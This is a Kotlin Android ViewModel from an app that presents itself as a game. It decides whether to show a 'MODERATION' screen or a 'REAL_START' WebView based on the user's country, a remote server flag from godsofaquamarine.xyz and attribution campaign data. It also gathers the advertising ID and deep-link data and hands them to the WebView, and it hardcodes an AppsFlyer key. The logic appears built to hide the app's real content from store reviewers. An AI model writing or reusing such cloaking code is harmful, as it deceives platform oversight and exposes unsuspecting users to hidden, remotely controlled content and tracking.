package com.skgames.traffi

import android.app.Application
import android.util.Log
import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.skgames.traffi.nev.Constance
import com.skgames.traffi.nev.DataForVebViev
import com.skgames.traffi.nev.DataFromApiResource
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import javax.inject.Inject

@HiltViewModel
class SortVievModell @Inject constructor(
    private val application: Application
) : ViewModel() {


    private var _currentMode = MutableLiveData<SortClass>()
    val currentMode: LiveData<SortClass>
        get() = _currentMode

    private val _ansvFromGeoService = MutableLiveData<DataFromApiResource<CountryCodeJS?>>()
    val ansvFromGeoService: LiveData<DataFromApiResource<CountryCodeJS?>>
        get() = _ansvFromGeoService

    private val _ansvFromDevil = MutableLiveData<DataFromApiResource<GeoDev>>()
    val ansvFromDevil: LiveData<DataFromApiResource<GeoDev>>
        get() = _ansvFromDevil

    private val _advertisingIdClient = MutableLiveData<String>()
    val advertisingIdClient: LiveData<String>
        get() = _advertisingIdClient

    private val _link = MutableLiveData<String>()
    val link: LiveData<String>
        get() = _link

    private val _appsFlyerDattaGotten = MutableLiveData<String>()
    val appsFlyerDattaGotten: LiveData<String>
        get() = _appsFlyerDattaGotten

    private val _appLinkData = MutableLiveData<String>()
    val appLinkData: LiveData<String>
        get() = _appLinkData


    private val appsFlyerConversionListener = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val dataGotten = data?.get(Constance.KEY_CAMPAIGN).toString()

            _appsFlyerDattaGotten.value = dataGotten
//            Hawk.put(Constance.KEY_DATA_GOTTEN_APPS, dataGotten)
        }

        override fun onConversionDataFail(p0: String?) {}
        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    fun fetchDeferredAppLinkData() {
        AppLinkData.fetchDeferredAppLinkData(
            application
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {

                val bgbggbg = appLinkData.targetUri.host.toString()
                _appLinkData.postValue(bgbggbg)

//                Hawk.put(Constance.KEY_APP_LINK_DATA, bgbggbg)
                _appLinkData.value = bgbggbg
            }
            if (appLinkData == null) {
            }
        }
    }

    init {
        _ansvFromGeoService.value = DataFromApiResource.Loading()
        _ansvFromGeoService.value = DataFromApiResource.Loading()

        viewModelScope.launch(Dispatchers.IO) {
            getAdvertisingIdClient()
            fetchDeferredAppLinkData()
        }


        viewModelScope.launch {
            getGeoData()
        }

    }

    fun sendDataForVebVeiv():DataForVebViev{
        return DataForVebViev(
            appsFlyerDattaGotten = appsFlyerDattaGotten.value.toString(),
            advertisingIdClient = advertisingIdClient.value.toString(),
            appLinkData = appLinkData.value.toString(),
            linkViev = link.value.toString()
        )
    }


    fun makeCheck() {

        val userGeo = ansvFromGeoService.value?.data?.countryCode ?: "noop"

        val listOfAllGeo = ansvFromDevil.value?.data?.geo ?: "none"
        val checker = ansvFromDevil.value?.data?.appsChecker ?: "99"
        val currentLink = ansvFromDevil.value?.data?.view ?: "errorLink"

        _link.value = currentLink

//        val dataGottenApps: String =
//            Hawk.get(Constance.KEY_DATA_GOTTEN_APPS, Constance.KEY_NOOOOO_DATA)
//        val dataAppLinkData: String =
//            Hawk.get(Constance.KEY_APP_LINK_DATA, Constance.KEY_NOOOOO_DATA)

        val dataGottenApps = _appsFlyerDattaGotten.value ?: Constance.KEY_NOOOOO_DATA
        val dataAppLinkData = _appLinkData.value ?: Constance.KEY_NOOOOO_DATA


        Log.d("lolo", "data before check:Checker $checker")
        Log.d("lolo", "data before check:listOfAllGeo $listOfAllGeo")
        Log.d("lolo", "data before check:userGeo $userGeo")
        Log.d(
            "lolo",
            "data before check:listOfAllGeo contains userGeo ${listOfAllGeo.contains(userGeo)}"
        )

        when (checker) {

            "1" -> {
                Log.d("lolo", "i am in 1 check")
                makeAppsInit()
                if (
                    dataGottenApps.contains(Constance.KEY_TDB2) || dataAppLinkData.contains(
                        Constance.KEY_TDB2
                    ) || listOfAllGeo.contains(userGeo)
                ) {
                    _currentMode.value = SortClass.REAL_START
                } else {
                    _currentMode.value = SortClass.MODERATION
                }
            }
            "55" -> {
                Log.d("lolo", "i am in 55 check")
                _currentMode.value = SortClass.TEST_VEB
            }
            else -> {
                Log.d("lolo", "i am in else check")
                if (listOfAllGeo.contains(userGeo)) {
                    Log.d("lolo", "i am in listOfAllGeo.contains(userGeo) after else check")
                    _currentMode.value = SortClass.REAL_START
                } else {
                    _currentMode.value = SortClass.MODERATION
                }
            }
        }

    }

    private fun makeAppsInit() {
        AppsFlyerLib.getInstance()
            .init("EUBo2sR9eDH3fa45JwM2Y7", appsFlyerConversionListener, application)
        AppsFlyerLib.getInstance().start(application)
    }

    suspend fun getDataDev() {
        val apiResponse = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://godsofaquamarine.xyz/")
            .build()
            .create(ServiceApi::class.java)

        if (apiResponse.getDataDev().isSuccessful) {
            val result = apiResponse.getDataDev().body()
            _ansvFromDevil.value = DataFromApiResource.Success(data = result!!)

            val responseVeiv = result.view
            val responseAppsCheker = result.appsChecker
            val responseGeo = result.geo

            Log.d("lolo", "responseVeiv $responseVeiv")
            Log.d("lolo", "responseAppsCheker $responseAppsCheker")
            Log.d("lolo", "responseGeo $responseGeo")

//            Hawk.put(Constance.KEY_DEVIL_VIEW, responseVeiv)
//            Hawk.put(Constance.KEY_DEVIL_APPS_CHECKER, responseAppsCheker)
//            Hawk.put(Constance.KEY_DEVIL_GEO, responseGeo)

        } else {
            _ansvFromDevil.value = DataFromApiResource.Error(message = "error during loading")
            Log.d("lolo", "error during loading")
        }
    }

    suspend fun getGeoData() {
        val frgtg = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(ServiceApi::class.java)

        try {
            val result = frgtg.getData()
            if (result.isSuccessful) {
                val cooode = result.body()

                Log.d("lolo", "CountryCode from some API $cooode")
                _ansvFromGeoService.value = DataFromApiResource.Success(data = cooode)
//
//                val codeForHavk = cooode?.countryCode
//                Hawk.put(Constance.KEY_GEO_DATA_PRO_IP, codeForHavk)

                // here previous data have already loaded
                getDataDev()
            }

        } catch (e: Exception) {
            _ansvFromGeoService.value = DataFromApiResource.Error(message = e.message.toString())
        }
    }


    private fun getAdvertisingIdClient() {
        val advertisingIdClient = AdvertisingIdClient(application)
        advertisingIdClient.start()
        val idUserAdvertising = advertisingIdClient.info.id ?: Constance.KEY_NULL_ADVERT_USER_ID

        Log.d("lolo", "AdvertisingIdClient $idUserAdvertising")

        _advertisingIdClient.postValue(idUserAdvertising)

//        Hawk.put(Constance.KEY_ADVERT_USER_ID, idUserAdvertising)
    }
}